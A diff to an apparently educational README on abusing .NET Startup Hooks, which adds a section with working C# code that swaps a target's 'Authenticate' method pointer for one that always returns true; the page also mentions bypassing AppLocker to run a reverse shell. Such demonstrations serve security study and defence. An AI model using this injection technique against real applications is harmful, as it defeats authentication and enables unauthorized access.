@@ -11,7 +11,7 @@ More info regarding Startup Hooks can be seen [here](https://github.com/dotnet/r
 In this demo, we will focus on
 1. Bypassing Applocker to run Reverse Shell
 2. Introspection and Modification of code or behaviour at Runtime
-
+3. Modification of entire Function at Runtime
 
 # How to define a Startup Hook
 
@@ -266,6 +266,60 @@ internal class StartupHook
 After setting up the hook, we can see that we are authenticated.
 
 <img width="675" alt="image" src="https://user-images.githubusercontent.com/12537739/174954663-d2d496d7-c825-4782-8a3e-3c96caa81e4e.png">
+
+# Modification of entire Function at Runtime
+
+An even more alarming thing we could do is to get the reference to a function and replace it to point to our own custom function. Below, we changed the `Authenticate` function of class `VulnerableClass` to point to `FakeAuthentication` function of class `Injection`.
+
+```cs
+internal class StartupHook
+{
+
+
+    public static void Initialize()
+    {
+        Type vulnerableClassType = Assembly.GetEntryAssembly()
+                .GetTypes()
+                .First(x => x.Name == "VulnerableClass");
+
+        MethodInfo methodToReplace = vulnerableClassType.GetMethod("Authenticate", BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public);
+
+
+        MethodInfo methodToInject = typeof(Injection).GetMethod("FakeAuthentication", BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public);
+
+        RuntimeHelpers.PrepareMethod(methodToReplace.MethodHandle);
+        
+        RuntimeHelpers.PrepareMethod(methodToInject.MethodHandle);
+
+        unsafe
+        {
+            if (IntPtr.Size == 4)
+            {
+                int* inj = (int*)methodToInject.MethodHandle.Value.ToPointer() + 2;
+                int* tar = (int*)methodToReplace.MethodHandle.Value.ToPointer() + 2;
+                *tar = *inj;
+            }
+            else
+            {
+                long* inj = (long*)methodToInject.MethodHandle.Value.ToPointer() + 1;
+                long* tar = (long*)methodToReplace.MethodHandle.Value.ToPointer() + 1;
+                *tar = *inj;
+            }
+        }
+
+    }
+
+}
+
+public class Injection
+{
+    // Always return true
+    public bool FakeAuthentication(string username, string password) => true;
+}
+```
+
+<img width="592" alt="image" src="https://user-images.githubusercontent.com/12537739/175815287-5be8aceb-2d02-40c8-888a-98fb51f985af.png">
+
 
 # Summary
 
